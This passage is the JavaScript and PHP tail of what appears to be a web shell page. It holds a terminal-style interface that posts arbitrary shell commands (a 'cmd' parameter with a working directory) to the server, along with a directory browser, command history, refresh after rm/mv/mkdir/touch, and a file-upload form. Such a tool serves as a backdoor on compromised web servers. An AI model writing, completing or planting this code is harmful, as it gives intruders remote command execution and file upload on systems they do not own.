    else if (e.key === 'ArrowUp') { e.preventDefault(); if (hidx > 0) { hidx--; inp.value = hist[hidx]; } }
    else if (e.key === 'ArrowDown') { e.preventDefault(); if (hidx < hist.length - 1) { hidx++; inp.value = hist[hidx]; } else { hidx = hist.length; inp.value = ''; } }
});

function updateFileName(input) {
    var nameSpan = document.getElementById('fileName');
    var label = document.getElementById('fileLabel');
    if (input.files && input.files.length > 0) {
        nameSpan.textContent = input.files[0].name;
        label.textContent = 'Change File';
        label.style.borderColor = '#00ff41';
        label.style.color = '#00ff41';
    } else {
        nameSpan.textContent = 'No file selected';
        label.textContent = 'Choose File';
        label.style.borderColor = '';
        label.style.color = '';
    }
}

function validateUpload() {
    var fileInput = document.getElementById('upload_file');
    if (!fileInput.files || fileInput.files.length === 0) {
        showBarNotification('⚠️ Warning: Please select a file to upload!', 'warning');
        return false;
    }
    return true;
}

function refreshFB(dir) {
    var d = dir || curDir;
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4 && xhr.status === 200) {
            renderFB(xhr.responseText, d);
        }
    };
    // List only directories using find or ls -d
    xhr.send('ajax=1&cmd=find . -maxdepth 1 -type d ! -name \".\" 2>/dev/null | sed \"s|^\\./||\" | sort&cwd=' + encodeURIComponent(d));
}

function renderFB(raw, dir) {
    var names = raw.split('\n').filter(function(l) { return l.trim(); });
    var h = '';
    
    // Parent Directory button
    if (dir !== '/') {
        h += '<div style="padding:2px 8px;margin-bottom:2px;">';
        h += '<div class="fi up back" onclick="goToParent()" style="text-align:center;padding:4px;font-size:10px;" title="Parent Directory">↑ Parent Directory</div>';
        h += '</div>';
    }
    
    // List all directories from current directory
    var dirs = [];
    for (var i = 0; i < names.length; i++) {
        var n = names[i];
        if (!n || n === '.' || n === '..') continue;
        dirs.push(n);
    }
    
    // Display directories
    if (dirs.length > 0) {
        for (var i = 0; i < dirs.length && i < 100; i++) {
            var n = dirs[i];
            var en = n.replace(/'/g, "\\'");
            h += '<div class="fi dir" onclick="navigateDir(\'' + en + '\')"><span class="nm">' + esc(n) + '/</span></div>';
        }
    } else {
        h += '<div style="color:#2a3a5a;padding:4px 12px;font-size:9px;">[no subdirectories]</div>';
    }
    
    document.getElementById('filebrowser').innerHTML = h;
}

function goToParent() {
    var p = curDir.split('/');
    p.pop();
    curDir = p.length > 0 ? p.join('/') : '/';
    if (curDir === '') curDir = '/';
    document.getElementById('ps1path').textContent = ' ' + curDir + ' ';
    refreshFB(curDir);
}

function navigateDir(d) {
    curDir = curDir.replace(/\/$/, '') + '/' + d;
    
    document.getElementById('ps1path').textContent = ' ' + curDir + ' ';
    refreshFB(curDir);
}

function navBack() {
    if (stackIdx >= 0) {
        var old = curDir;
        curDir = dirStack[stackIdx];
        stackIdx--;
        // Push current to forward stack (we just use the dirStack as full history)
        document.getElementById('ps1path').textContent = ' ' + curDir + ' ';
        refreshFB(curDir);
    }
}

function navFwd() {
    if (stackIdx < dirStack.length - 1) {
        stackIdx++;
        curDir = dirStack[stackIdx];
        document.getElementById('ps1path').textContent = ' ' + curDir + ' ';
        refreshFB(curDir);
    }
}

function checkRefresh(c) {
    var match = c.match(/^cd\s+(.+)$/);
    if (match) {
        var nd = match[1].trim();
        if (/^\.{3,}$/.test(nd)) {
            // Multiple dots - just show no output, silently ignore
            return;
        }
        var old = curDir;
        if (nd === '..') {
            var p = curDir.split('/'); p.pop();
            curDir = p.length > 0 ? p.join('/') : '/';
        } else if (nd.indexOf('/') === 0 || nd.indexOf('~') === 0) {
            curDir = nd;
        } else if (nd.match(/^\.\//)) {
            curDir = curDir.replace(/\/$/, '') + '/' + nd.substring(2);
        } else if (nd === '-') {
            addLine('<span class="l info">cd -: no previous directory stored</span>');
            return;
        } else {
            curDir = curDir.replace(/\/$/, '') + '/' + nd;
        }
        // Update history
        if (stackIdx < dirStack.length - 1) {
            dirStack = dirStack.slice(0, stackIdx + 1);
        }
        dirStack.push(old);
        stackIdx = dirStack.length - 1;
        
        document.getElementById('ps1path').textContent = ' ' + curDir + ' ';
        refreshFB(curDir);
    } else if (c.indexOf('rm ') === 0 || c.indexOf('mv ') === 0 || c.indexOf('mkdir ') === 0 || c.indexOf('touch ') === 0) {
        refreshFB(curDir);
    }
}

function toggleSidebar() {
    var sidebar = document.getElementById('sidebar');
    sidebar.classList.toggle('show');
}

function toggleSec(el) {
    var body = el.nextElementSibling;
    var arrow = el.querySelector('.collapse');
    if (body.classList.contains('hidden')) {
        body.classList.remove('hidden');
        arrow.classList.add('open');
    } else {
        body.classList.add('hidden');
        arrow.classList.remove('open');
    }
}

function showNotification(message) {
    var notif = document.createElement('div');
    notif.className = 'notification';
    notif.textContent = message;
    document.body.appendChild(notif);
    setTimeout(function() {
        document.body.removeChild(notif);
    }, 10000);
}

function showBarNotification(message, type) {
    var msg = document.getElementById('notificationMessage');
    
    // Set color based on type
    if (type === 'success') {
        msg.style.color = '#00ff88';
    } else if (type === 'warning') {
        msg.style.color = '#ffcc44';
    } else if (type === 'error') {
        msg.style.color = '#ff4466';
    } else {
        msg.style.color = '#6a8fb4';
    }
    
    msg.textContent = message;
    
    // Auto-hide after 10 seconds
    setTimeout(function() {
        msg.textContent = '';
    }, 10000);
}

setTimeout(function() { refreshFB(curDir); }, 300);

<?php if ($show_upload_alert && !empty($upload_msg)): ?>
// Show upload success notification in bar
showBarNotification('✓ <?= addslashes($upload_msg) ?>', 'success');
<?php endif; ?>
</script>
</body>
</html>